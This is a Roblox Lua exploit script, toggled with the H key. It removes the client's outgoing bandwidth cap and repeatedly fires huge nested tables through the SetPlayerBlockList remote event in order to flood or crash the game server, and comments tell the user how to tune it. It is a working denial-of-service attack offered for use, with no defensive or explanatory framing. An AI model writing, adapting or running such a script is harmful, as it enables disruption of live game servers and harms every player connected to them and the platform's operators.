
local UserInputService = game:GetService("UserInputService")
_G.Off = true
_G.Max = 25
_G.Loops = 3
_G.WaitTime = 1.5

UserInputService.InputBegan:Connect(function(input, gameProcessedEvent)
    if input.KeyCode == Enum.KeyCode.H then
        _G.Off = not _G.Off
        print("toggled: " .. tostring(_G.Off))
    end
end)

while task.wait(_G.WaitTime) do --// don't change it's the best
    if _G.Off then continue end

    game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)

    local function getmaxvalue(val)
        local mainvalueifonetable = 499999
        if type(val) ~= "number" then
            return nil
        end
        local calculateperfectval = (mainvalueifonetable/(val+2))
        return calculateperfectval
    end

    local function bomb(tableincrease, tries)
        local maintable = {}
        local spammedtable = {}
        table.insert(spammedtable, {})
        z = spammedtable[1]
        for i = 1, tableincrease do
            local tableins = {}
            table.insert(z, tableins)
            z = tableins
        end
        local calculatemax = getmaxvalue(tableincrease)
        local maximum
        if calculatemax then
            maximum = calculatemax
        else
            maximum = 999999
        end

        for i = 1, maximum do
            table.insert(maintable, spammedtable)
        end

        for i = 1, tries do
            game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(maintable)
        end
    end

    bomb(_G.Max, _G.Loops) --// change values if client crashes
end

local ignore = game:GetService("Workspace").ignore

for i,v in pairs(ignore:GetChildren()) do
    if v:IsA("BasePart") then
        v:Destroy()
    end
end

ignore.ChildAdded:Connect(function(Child)
    if Child:IsA("UnionOperation") then
        Child:Destroy()
    end
end)